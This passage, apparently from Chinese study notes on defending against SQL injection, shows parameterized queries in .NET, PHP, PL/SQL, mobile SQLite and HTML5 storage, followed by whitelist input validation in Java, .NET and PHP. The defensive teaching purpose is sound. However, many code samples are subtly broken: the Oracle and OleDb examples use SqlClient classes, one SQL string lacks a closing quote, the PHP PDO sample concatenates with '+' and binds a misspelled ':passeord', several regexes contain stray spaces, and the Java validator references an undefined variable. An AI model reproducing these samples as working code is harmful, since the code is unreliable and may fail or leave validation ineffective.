DB和ODBC数据源的System.Data.OleDb和System.Data.Odbc</p>\n<p>ADO.NET数据提供程序以及参数命名语法</p>\n<table>\n<thead>\n<tr>\n<th>数据提供程序</th>\n<th>参数语法</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>System.Data.SqlClient</td>\n<td>@parameter</td>\n</tr>\n<tr>\n<td>System.Data.OracleClient</td>\n<td>:parameter(只能位于参数化的SQL命令文本中)</td>\n</tr>\n<tr>\n<td>System.Data.OleDb</td>\n<td>带问号占位符(?)的位置参数</td>\n</tr>\n<tr>\n<td>System.Data.Odbc</td>\n<td>带问号占位符(?)的位置参数</td>\n</tr>\n</tbody></table>\n<p>使用SqlClient数据提供程序将其重写为.NET格式的参数化语句</p>\n<pre class=\"line-numbers language-c#\" data-language=\"c#\"><code class=\"language-c#\">SqlConnection con = new SqlConnection(Connectionstring);\nstring Sql = \"SELECT * FROM users WHERE username=@username\" + \"AND password=@password\";\ncmd = new SqlCommand(Sql, con); \n//将参数添加到SQL查询中\ncmd.Parameters.Add(\"@username\",//参数名\n                   SqlDbType.NVarChar,//数据类型\n                   16);//长度\ncmd.Parameters.Add(\"@password\",\n                   SqlDbType.NVarChar,\n                   16);\ncmd.Parameters.Value[\"@username\"]=username;//设置参数\ncmd.Parameters.Value[\"@password\"]=password;//提供参数值\nreader = cmd.ExecuteReader();<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>使用OracleClient数据提供程序重写的同一.NET格式的参数化语句。 在命令文本（SQL字符串）中的参数前面添加了冒号，而不是在代码的其他位置</p>\n<pre class=\"line-numbers language-c#\" data-language=\"c#\"><code class=\"language-c#\">SqlConnection con = new SqlConnection(Connectionstring);\nstring Sql = \"SELECT * FROM users WHERE username=:username\" + \"AND password=:password\";\ncmd = new SqlCommand(Sql, con); \n//将参数添加到SQL查询中\ncmd.Parameters.Add(\"username\",//参数名\n                   SqlDbType.NVarChar,//数据类型\n                   16);//长度\ncmd.Parameters.Add(\"password\",\n                   SqlDbType.NVarChar,\n                   16);\ncmd.Parameters.Value[\"username\"]=username;//设置参数\ncmd.Parameters.Value[\"password\"]=password;//提供参数值\nreader = cmd.ExecuteReader();<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>使用OleDbClient数据提供程序重写的同一.NET格式的参数化语句。 使用OleDbClient或OleDb数据提供程序时，必须按照正确的问号占位符顺序来添加参数</p>\n<pre class=\"line-numbers language-c#\" data-language=\"c#\"><code class=\"language-c#\">SqlConnection con = new SqlConnection(Connectionstring);\nstring Sql = \"SELECT * FROM users WHERE username=? + \"AND password=?\";\ncmd = new SqlCommand(Sql, con); \n//将参数添加到SQL查询中\ncmd.Parameters.Add(\"@username\",//参数名\n                   SqlDbType.NVarChar,//数据类型\n                   16);//长度\ncmd.Parameters.Add(\"@password\",\n                   SqlDbType.NVarChar,\n                   16);\ncmd.Parameters.Value[\"@username\"]=username;//设置参数\ncmd.Parameters.Value[\"@password\"]=password;//提供参数值\nreader = cmd.ExecuteReader();<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"PHP中的参数化语句\"><a href=\"#PHP中的参数化语句\" class=\"headerlink\" title=\"PHP中的参数化语句\"></a>PHP中的参数化语句</h4><p>PHP同样包含很多用于访问数据库的框架。本节介绍三种最常见的框架：访问MySQL数据库的mysqli包，PEAR::MDB2包（它替代了流行的PEAR::DB包）以及新的PHP数据对象（PHP Data Object, PDO)框架，它们均为使用参数化语句提供了便利。</p>\n<p>mysqli包适用于PHP 5.x，可以访问MySQL 4.1及之后的版本。通过使用问号占位符来支持参数化语句。下面的例子展示了一条使用mysqli包的参数化语句</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$con</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">mysqli</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"localhost\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"username\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"password\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"db\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT * FROM users WHERE username=? AND password=?\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$cmd</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$con</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">prepare</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//将参数添加到SQL查询中</span>\n<span class=\"token variable\">$cmd</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">bind_param</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"ss\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//将参数作为字符串绑定</span>\n<span class=\"token variable\">$cmd</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>当在PHP中使用PostgreSQL数据库时，PHP 5.1.0引入了一个简单的方法以便使用参数化的查询语句。该方法名为pg_query_params(),它允许开发人员在同一行代码内提供SQL查询 和参数</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">pg_query_params</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"SELECT * FROM users WHERE username=<span class=\"token interpolation\"><span class=\"token variable\">$1</span></span> AND password=<span class=\"token interpolation\"><span class=\"token variable\">$2</span></span>\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">Array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>PEAR::MDB2包是一种被广泛使用且独立于供应商的数据库访问框架，MDB2支持使用冒号字符的命名参数和问号占位符两种方式来定义参数。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$mdb2</span> <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span> <span class=\"token class-name static-context\">MDB2</span><span class=\"token operator\">::</span><span class=\"token function\">factory</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dsn</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT * FROM users WHERE username=? AND password=?\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$types</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'text'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'text'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">;</span><span class=\"token comment\">//设置数据类型</span>\n<span class=\"token variable\">$cmd</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$mdb2</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">prepare</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$types</span><span class=\"token punctuation\">,</span><span class=\"token constant\">MDS2_PREPARE_MANIP</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//要传递的参数</span>\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$cmd</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>PDO包含在PHP 5.1及之后的版本中。它是一个面向对象且独立于供应商的数据层，用于访问数据库。PDO既支持使用冒号字符的命名参数，也支持使用问号占位符定义的参数</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT * FROM uses WHERE username=:username AND\"</span><span class=\"token operator\">+</span><span class=\"token string double-quoted-string\">\"password=:password\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$stmt</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$dbh</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">prepare</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//绑定值和数据类型</span>\n<span class=\"token variable\">$stmt</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">bindParam</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">':username'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span><span class=\"token class-name static-context\">PDO</span><span class=\"token operator\">::</span><span class=\"token constant\">PARAM_STR</span><span class=\"token punctuation\">,</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$stmt</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">bindParam</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">':passeord'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">,</span><span class=\"token class-name static-context\">PDO</span><span class=\"token operator\">::</span><span class=\"token constant\">PARAM_STR</span><span class=\"token punctuation\">,</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$stmt</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"PL-SQL中的参数化语句\"><a href=\"#PL-SQL中的参数化语句\" class=\"headerlink\" title=\"PL/SQL中的参数化语句\"></a>PL/SQL中的参数化语句</h4><p>Oracle PL/SQL同样支持在数据库层代码中使用参数化查询。PL/SQL支持使用带编号的冒号字符(例如:1)来绑定参数。使用带绑定参数的PL/SQL在匿名的 PL/SQL块中构造参数化语句：</p>\n<pre class=\"line-numbers language-plsql\" data-language=\"plsql\"><code class=\"language-plsql\"><span class=\"token keyword\">DECLARE</span> username varchar2<span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\npassword varchar2<span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">result</span> integer<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">BEGIN</span> <span class=\"token keyword\">Execute</span> <span class=\"token keyword\">immediate</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">SELECT</span> <span class=\"token function\">count</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">FROM</span> users <span class=\"token keyword\">where</span> username<span class=\"token operator\">=</span><span class=\"token operator\">:</span><span class=\"token number\">1</span> <span class=\"token keyword\">and</span> password<span class=\"token operator\">=</span><span class=\"token operator\">:</span><span class=\"token number\">2</span>' <span class=\"token keyword\">into</span> <span class=\"token keyword\">result</span> <span class=\"token keyword\">using</span> username<span class=\"token punctuation\">,</span> password<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">END</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"移动应用中的参数化语句\"><a href=\"#移动应用中的参数化语句\" class=\"headerlink\" title=\"移动应用中的参数化语句\"></a>移动应用中的参数化语句</h3><p>基于iOS和Android的设备都具有内建于设备(in-device)的数据库支持，并提供了创建、更新和查询这些数据库的API。</p>\n<h4 id=\"iOS应用程序中的参数化语句\"><a href=\"#iOS应用程序中的参数化语句\" class=\"headerlink\" title=\"iOS应用程序中的参数化语句\"></a>iOS应用程序中的参数化语句</h4><p>对于iOS系统，用于开发应用的API通过SQLite库libsqlite3.dylib支持SQLite。如果直接使用SQLite(而不是通过Apple框架Core Data),那么最流行的框架是FMDB。使用FMDB框架时，可以使用executeUpdate()方法构建参数化的insert语句：</p>\n<pre class=\"line-numbers language-sqlite\" data-language=\"sqlite\"><code class=\"language-sqlite\">[db executeUpdate:@\"INSERT INTO artists (name) VALUES (?)\",@\"Sinead O'Connor\"];<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>与之类似，如果想查询数据库，可以使用executeQuery()方法：</p>\n<pre class=\"line-numbers language-sqlite\" data-language=\"sqlite\"><code class=\"language-sqlite\">FMResultSet *rs = [db executeQuery:@\"SELECT * FROM songs WHERE artist=?\",@\"Sinead O'Connor\"];<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h4 id=\"Android应用程序中的参数化语句\"><a href=\"#Android应用程序中的参数化语句\" class=\"headerlink\" title=\"Android应用程序中的参数化语句\"></a>Android应用程序中的参数化语句</h4><p>Android设备也包含了用于访问SQLite数据库子系统的AM。该API支持参数化语句，开发人员可以分别提供查询和数据。</p>\n<p>对于insert语句，可以使用SQLiteStatement类：</p>\n<pre class=\"line-numbers language-sqlite\" data-language=\"sqlite\"><code class=\"language-sqlite\">statement = db.compileStatement(\"INSERT INTO artists (name) VALUES (?)\");\nstatement.bind(1, \"Sinead O'Connor\");\nstatement.executeInsert();<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>当查询数据库时，只须在SQLite-Database对象上直接使用query()</p>\n<pre class=\"line-numbers language-sqlite\" data-language=\"sqlite\"><code class=\"language-sqlite\">db.query(\"songs\",\nnew String[ ] { \"title\" } /* columns to return */, \"artist = ?\" /* where clause */,\nnew String [ ] { \"Sinead O'Connor\" } /* parameters to bind */,\nnull /* group by */,\nnull /* having */,\nnull /* order by */\n);<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"HTML5浏览器存储中的参数化语句\"><a href=\"#HTML5浏览器存储中的参数化语句\" class=\"headerlink\" title=\"HTML5浏览器存储中的参数化语句\"></a>HTML5浏览器存储中的参数化语句</h4><p>在HTML5标准中可以使用两种类型的存储——Web SQL Database规范和Web Storage规范。该规范中包含了一个简单的方法用于创建参数化查询，即使用executeSql())方法</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">t<span class=\"token punctuation\">.</span>executeSql<span class=\"token punctuation\">(</span><span class=\"token string\">'SELECT * FROM songs WHERE artist=? AND song=?'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>artist<span class=\"token punctuation\">,</span> songName<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">,</span> <span class=\"token keyword\">data</span><span class=\"token punctuation\">)</span> {\n<span class=\"token comment\">//对数据执行某些操作</span>\n}<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>在上面的代码中，t代表事务(transaction), SQL语句将在该事务中执行。在SQL语句中使用问号作为占位符，并提供了一个参数数组，该数组中元素的顺序就是这些参数应用于SQL 语句的顺序。最后一个参数是回调函数，用于处理从数据库返回的数据。</p>\n<p>Web Storage规范则使用setltem()、getltem()和removeltem()等方法，提供了一种简单的键/值对的存储方式。在该规范中并没有通过字符串连接来构建语句的查询语言，因此类似于SQL 注入这样的攻击对Web Storage无效。</p>\n<h3 id=\"输入验证\"><a href=\"#输入验证\" class=\"headerlink\" title=\"输入验证\"></a>输入验证</h3><p>输入验证是指测试应用程序接收到的输入，以保证其符合应用程序中标准定义的过程。它可以简单到将参数限制成某种类型，也可以复杂到使用正则表达式或业务逻辑来验证输入。</p>\n<p>白名单验证(有时称为包含验证或正验证)和黑名单验证(有时称 为排除验证或负验证)。</p>\n<h4 id=\"白名单\"><a href=\"#白名单\" class=\"headerlink\" title=\"白名单\"></a>白名单</h4><p>白名单验证是只接收已记录在案的良好输入的操作。</p>\n<p>要点:</p>\n<p>输入的数据是否在白名单规则内</p>\n<p>数据类型是否满足</p>\n<p>数据大小是否正确</p>\n<p>数据范围</p>\n<p>数据内容</p>\n<p>实现内容验证的常用方法是使用正则表达式。</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\">#验证字符串中是否包含美国邮政编码：</span>\n^<span class=\"token punctuation\">\\</span>d<span class=\"token punctuation\">{</span><span class=\"token number\">5</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span>-<span class=\"token punctuation\">\\</span>d<span class=\"token punctuation\">{</span><span class=\"token number\">4</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>?$<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>该正则表达式按下列规则匹配5位和5位加4位的邮政编码：</p>\n<p>^\\d{5}：准确匹配字符串开头的5位数字</p>\n<p>(-\\d{4})?：准确匹配可能存在（出现）或完全不存在（未出现）的破折号字符加4位数字。</p>\n<p>$:出现在字符串末尾。如果字符串末尾包含附加的内容，正则表达式将不匹配。</p>\n<p>设计输入验证和处理策略</p>\n<ul>\n<li><p>在应用程序输入层使用白名单输入验证以便验证所有用户输入都符合应用要接 收的内容。应用只允许接收符合期望格式的输入。</p>\n</li>\n<li><p>在客户端浏览器上同样执行白名单输入验证，这样可以防止为用户输入不可接 收的数据时服务器和浏览器间的往返传递。不能将该操作作为安全控制手段，因为攻击者可以修改来自用户浏览器的所有数据。</p>\n</li>\n<li><p>在Web应用防火墙（WAF）层使用黑名单和白名单输入验证（以漏洞“签名”和“有 经验”行为的形式）以便提供入侵检测/阻止功能和监视应用攻击。</p>\n</li>\n<li><p>在应用程序中自始自终地使用参数化语句以保证执行安全的SQL执行。</p>\n</li>\n<li><p>在数据库中使用编码技术以便在动态SQL中使用输入时安全地对其编码。</p>\n</li>\n<li><p>在使用从数据库中提取的数据之前恰当地对其进行编码。例如，将浏览器中显示的数据针对跨站脚本进行编码。</p>\n</li>\n</ul>\n<h5 id=\"用已知值进行检验\"><a href=\"#用已知值进行检验\" class=\"headerlink\" title=\"用已知值进行检验\"></a>用已知值进行检验</h5><p>将输入值与一个有效值的列表进行比较，如果输入值不在列表中，就拒绝该输入，这是一种强大但常常未被充分利用的检验输入值的方法。通过将值与一个列表进行比较，可以完全控制可能的输入值以及输入可能通过的代码路径。</p>\n<p>间接输入(input indirection)是另一种用已知值进行检验的方法。在这种方法中，服务器端并不接收直接来自客户端的值，客户端呈现一个允许值的列表，并向服务器端提交选中值的索引。</p>\n<h4 id=\"黑名单\"><a href=\"#黑名单\" class=\"headerlink\" title=\"黑名单\"></a>黑名单</h4><p>黑名单验证是只拒绝己记录在案的不良输入的操作，它通过浏览输入的内容来查找是否存在己知的不良字符、字符串或模式。</p>\n<p>在使用黑名单的同时结合使用输出编码以保证对传递到其他位置（比如，传递给数据库）的输入进行附加检查，从而保证能正确地处理该输入以防止SQL注入。</p>\n<h4 id=\"Java中的输入验证\"><a href=\"#Java中的输入验证\" class=\"headerlink\" title=\"Java中的输入验证\"></a>Java中的输入验证</h4><p>Java中的输入验证支持专属于正在使用的框架。</p>\n<p>定义一个输入验证类，该类实现了<code>javax.faces.validator.Validator</code>接口</p>\n<p>请参考下列代码片段并将其作为验证JSF(Java Server Faces, JSF)中用户名的例子</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">UsernameValidator</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">Validator</span> <span class=\"token punctuation\">{</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">validate</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">FacesContext</span> facesContext<span class=\"token punctuation\">,</span>\n<span class=\"token class-name\">UIComponent</span> uIComponent<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span> value<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">ValidatorException</span><span class=\"token punctuation\">{</span>\n<span class=\"token comment\">//获取用户名并转换为一个字符串</span>\n<span class=\"token class-name\">String</span> username <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">)</span>value<span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//建立正则表达式</span>\n<span class=\"token class-name\">Pattern</span> p <span class=\"token operator\">=</span> <span class=\"token class-name\">Pattern</span><span class=\"token punctuation\">.</span>compile <span class=\"token punctuation\">(</span><span class=\"token string\">\"^[a-zA-z] {8, 12}$\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//匹配用户名</span>\n<span class=\"token class-name\">Matcher</span> m <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span><span class=\"token function\">matcher</span><span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>matchFound<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n<span class=\"token class-name\">FacesMessage</span> message <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">FacesMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nmessage<span class=\"token punctuation\">.</span><span class=\"token function\">setDetail</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Not valid - it must be 8-12 letter only\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nmessage<span class=\"token punctuation\">.</span><span class=\"token function\">setSummary</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Username not valid\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nmessage<span class=\"token punctuation\">.</span><span class=\"token function\">setseverity</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">FacesMessage</span><span class=\"token punctuation\">.</span><span class=\"token constant\">SEVERITY_ERROR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ValidatorException</span><span class=\"token punctuation\">(</span>message<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>需要将下列内容添加到faces-config.xml文件中以便启用上述验证器</p>\n<pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>validator</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>validator-id</span><span class=\"token punctuation\">&gt;</span></span>namespace.UsernameValidator<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>validator-id</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>validator-class</span><span class=\"token punctuation\">&gt;</span></span>namespace.package.UsernameValidator<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>validatorclass</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>validator</span><span class=\"token punctuation\">&gt;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>接下来可以在相关的JSP文件中引用在faces-config.xml文件中添加的内容</p>\n<pre class=\"line-numbers language-jsp\" data-language=\"jsp\"><code class=\"language-jsp\">&lt;h:inputText value=\"username\" id=\"username\"\nrequired=\"true\"&gt;&lt;f:validator\nvalidatorId=\"namespace.UsernameValidator\" /&gt;\n&lt;/h:inputText&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>在Java中实现输入验证时，还有一种很有用的资源OWASP ESAPI(Enterprise Security API)，包括org.owasp.esapi.reference.DefaultValidator输入验证类的实现，可以直接使用它，也可以将它作为自定义输入验证引擎的参考实现。</p>\n<h4 id=\"NET中的输入验证\"><a href=\"#NET中的输入验证\" class=\"headerlink\" title=\".NET中的输入验证\"></a>.NET中的输入验证</h4><p>ASP.NET提供了<code>Regular-Expression Validator</code>控件和<code>Custom Validator</code>控件，执行客户端验证。</p>\n<p>下列代码是使用<code>RegularExpressionValidator</code>验证用户名的例子，用户名中只能包含字母(大写和小写)并且总长度必须介于8到12个字符之间。</p>\n<pre class=\"line-numbers language-asp\" data-language=\"asp\"><code class=\"language-asp\">&amp;ltasp:textbox id=\"userName\" runat=\"server\"/&gt;\n&amp;ltasp:RegularExpressionValidator id=\"usernameRegEx\" runat=\"server\" ControlToValidate=\"userName\"\nErrorMessage=\"Username must contain 8 - 12 letters only.\"\nValidationExpression=\"^[a-zA-Z]{8,12}$\" /&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>接下来的代码片段是使用<code>CustomValidator</code>验证口令是否为正确格式的例子。创建两个用户定义函数<code>PwdValidate</code>位于服务器上，负责对口令值进行验证；<code>ClientPwdValidate</code>位于客户端的JavaScript或VBScript中，负责对用户浏览器上的口令值进行验证。</p>\n<pre class=\"line-numbers language-asp\" data-language=\"asp\"><code class=\"language-asp\">&amp;ltasp:textbox id= \"txt Pas sword\" runat=\"server\"/&gt;\n&amp;ltasp:CustomValidator runat=\"server\" ControlToValidate=\"txtPassword\"\nClientValidationFunction=\"ClientPwdValidate\"\nErrorMessage=\"Password does not meet requirements.\"\nOnServerValidate=\"PwdValidate\" /&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"PHP中的输入验证\"><a href=\"#PHP中的输入验证\" class=\"headerlink\" title=\"PHP中的输入验证\"></a>PHP中的输入验证</h4><p>PHP不直接依赖于表示层，因而PHP中的输入验证支持属于所使用的框架。许多PHP应用程序直接在代码中实现输入验证。</p>\n<p>可以使用PHP中的很多函数作为构造输入验证的基本构造块，包括：</p>\n<ul>\n<li><p>preg_match(regex,matchstring):使用正则表达式regex对 matchstring执行正则表达式匹配。</p>\n</li>\n<li><p>is_&lt;type＞(input):检查输入是否＜type＞，例如 is_numeric()。</p>\n</li>\n<li><p>strlen(input)：检查输入的长度。</p>\n</li>\n</ul>\n<p>使用preg_match验证表单参数：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$username</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/^[a-zA-Z] {8, 12}$/D\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n<span class=\"token comment\">//处理验证失败的情况</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 